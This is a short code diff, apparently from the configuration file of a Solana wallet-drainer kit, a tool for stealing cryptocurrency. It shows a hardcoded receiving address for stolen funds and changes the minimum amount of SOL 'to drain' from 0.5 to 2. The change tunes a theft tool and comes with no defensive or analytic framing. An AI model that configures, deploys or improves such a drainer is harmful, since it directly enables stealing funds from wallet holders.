@@ -3,7 +3,7 @@ const receiveAddress = "3QAPWMUo8NHQqxUCn7Pxhny8aTfcH1cBkDK5L9Adt6bY"; // Adress
 
 /*   = = = = = AMOUNT = = = = =   */
 const amount = {
-    minimal: 0.5 // Minimal of amount of Solana to drain (2.0 is the minimum supported)
+    minimal: 2 // Minimal of amount of Solana to drain (2.0 is the minimum supported)
 }
 
 /*   = = = = = MODES = = = = =   */
